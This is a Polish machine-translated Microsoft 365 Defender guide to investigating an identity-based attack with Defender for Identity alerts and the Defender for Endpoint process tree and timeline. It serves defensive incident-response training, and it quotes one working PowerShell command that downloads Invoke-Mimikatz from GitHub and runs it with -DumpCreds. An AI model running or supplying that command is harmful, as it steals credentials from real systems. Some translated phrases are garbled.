---
title: Przykładowy atak oparty na tożsamości
description: Przesuń się przez przykładową analizę ataków opartych na tożsamości.
keywords: zdarzenia, alerty, badanie, korelacja, atak, komputery, urządzenia, użytkownicy, tożsamości, tożsamość, skrzynka pocztowa, poczta e-mail, 365, microsoft, m365, reagowanie na incydenty, cyberataki
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 883c0480b5f8cb35abfe59458d35c8d1274b8493
ms.sourcegitcommit: bdd6ffc6ebe4e6cb212ab22793d9513dae6d798c
ms.translationtype: MT
ms.contentlocale: pl-PL
ms.lasthandoff: 03/08/2022
ms.locfileid: "63327540"
---
# <a name="example-of-an-identity-based-attack"></a>Przykładowy atak oparty na tożsamości

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Dotyczy:**
- Microsoft 365 Defender

Usługa Microsoft Defender for Identity może pomóc w wykryciu złośliwych prób naruszenia tożsamości w organizacji. Ponieważ program Defender for Identity jest zintegrowany z programem Microsoft 365 Defender, analitycy zabezpieczeń mogą mieć wgląd w zagrożenia pochodzące z usługi Defender for Identity, takie jak podejrzewane próby podwyższenia uprawnień użytkownika Netlogon.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Analizowanie ataków w programie Microsoft Defender dla tożsamości

Microsoft 365 Defender umożliwia analitykom filtrowanie alertów przez wykrywanie źródła na karcie **Alerty** na stronie zdarzeń. W poniższym przykładzie źródło wykrywania jest filtrowane do usługi **Defender for Identity**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Przykład filtrowania źródła wykrywania dla usługi Defender for Identity.":::

Wybranie **alertu o podejrzeniu** o przemięcie przez skrót powoduje wyświetlenie strony w programie Microsoft Defender dla aplikacji w chmurze, która zawiera bardziej szczegółowe informacje. Zawsze możesz dowiedzieć się więcej o alertach lub atakach, wybierając pozycję Dowiedz się więcej o tym typie **alertu**, aby przeczytać opis ataków oraz sugestie dotyczące środków zaradczych.[](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002)
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Przykładowy alert o podejrzeniu o przeoczycie krzyżyka."::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Badanie tego samego ataku w programie Microsoft Defender dla punktu końcowego

Alternatywnie analityk może użyć usługi Defender for Endpoint, aby dowiedzieć się więcej o aktywności w punkcie końcowym. Wybierz zdarzenie z kolejki zdarzeń, a następnie wybierz **kartę Alerty** . W tym miejscu także mogą zidentyfikować źródło wykrywania. Źródło wykrywania oznaczone jako EDR oznacza Endpoint Detection and Response (Wykrywanie punktu końcowego i odpowiedzi), czyli Defender for Endpoint (Punkt końcowy). W tym miejscu analityk wybiera alert wykryty przez EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Przykład wykrywania punktu końcowego i odpowiedzi w programie Defender for Endpoint."::: 

Na stronie alertu są wyświetlane różne istotne informacje, takie jak nazwa urządzenia, nazwa użytkownika, stan automatycznego badania i szczegóły alertu. Historia alertów przedstawia wizualną reprezentację drzewa procesu. Drzewo procesu jest hierarchiczną reprezentacją procesów nadrzędnych i podrzędnych powiązanych z alertem.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Przykład drzewa procesu alertu w programie Defender dla punktu końcowego."::: 

Każdy proces można rozwinąć, aby wyświetlić dodatkowe szczegóły. Szczegóły, które może zobaczyć analityk, to rzeczywiste polecenia wprowadzone w ramach złośliwego skryptu, adresy IP połączeń wychodzących i inne przydatne informacje.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Example of process details in Defender for Endpoint.":::
 
Wybierając pozycję **Zobacz na osi czasu**, analityk może jeszcze bardziej przejść do szczegółów w celu określenia dokładnego czasu naruszenia. 

Program Microsoft Defender for Endpoint może wykrywać wiele złośliwych plików i skryptów. Jednak z powodu wielu legalnych zastosowań połączeń wychodzących, programu PowerShell i działań w wierszu polecenia niektóre działania będą uznawane za ważne do czasu, aż zostanie w wyniku tego złośliwy plik lub działanie. Dlatego korzystanie z osi czasu ułatwia analitykom stosowanie alertu w kontekście otaczającego go działania w celu określenia pierwotnego źródła lub czasu ataków, które w innym przypadku jest przesłonięte przez wspólny system plików i działania użytkowników. 

W tym celu analityk uruchamiał się w momencie wykrywania alertu (na czerwono) i przewijał w dół w czasie, aby ustalić, kiedy pierwotne działanie, które w rzeczywistości spowodowało złośliwe działanie. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Przykład rozpoczynania w momencie wykrywania alertu."::: 

Ważne jest zrozumienie i rozróżnienie typowych działań, takich jak połączenia usługi Windows Update Windows, ruch aktywacji zaufanego oprogramowania, inne typowe połączenia z witrynami firmy Microsoft, aktywność internetowa innych firm, działania Microsoft Endpoint Configuration Manager i inne aktywność ekwiązyjna ze względu na podejrzane działania. Można to zrobić za pomocą filtrów osi czasu. Istnieje wiele filtrów, które mogą wyróżniać określone działania podczas odfiltrowania danych, których analityk nie chce wyświetlać. 

Na poniższej ilustracji analityk przefiltrował wyświetlanie tylko zdarzeń sieci i procesów. Pozwala to analitykowi na wyświetlanie połączeń sieciowych i procesów otaczających zdarzenie, w którym Notatnik nawiązył połączenie z adresem IP, co było również widać w drzewie procesu. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Przykład tego, Notatnik połączenia wychodzącego za jego Notatnik."::: 

W tym konkretnym zdarzeniu Notatnik zostało użyte do nawiązaniu złośliwego połączenia wychodzącego. Jednak często atakujący będą po prostu używać oprogramowania iexplorer.exe do nawiązywania połączeń w celu pobrania złośliwego ładowania, ponieważ zwykle iexplorer.exe procesy są traktowane jako zwykła aktywność w przeglądarkach internetowych.

Innym elementem do wyszukiwania na osi czasu będzie program PowerShell używany do połączeń wychodzących. Analityk będzie szukać skutecznych połączeń programu PowerShell z poleceniami `IEX (New-Object Net.Webclient)` , takimi jak połączenia wychodzące z witryną internetową hostującym złośliwy plik. 

W poniższym przykładzie program PowerShell został użyty do pobrania i wykonania mimikatz z witryny internetowej:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Analityk może szybko wyszukać słowa kluczowe, wpisując słowo kluczowe na pasku wyszukiwania, aby wyświetlić tylko zdarzenia utworzone za pomocą programu PowerShell. 

## <a name="next-step"></a>Następny krok

Zobacz [ścieżkę badania wyłudzania](first-incident-path-phishing.md) informacji.

## <a name="see-also"></a>Zobacz też

- [Omówienie zdarzeń](incidents-overview.md)
- [Zarządzanie zdarzeniami](manage-incidents.md)
- [Badanie zdarzeń](investigate-incidents.md)
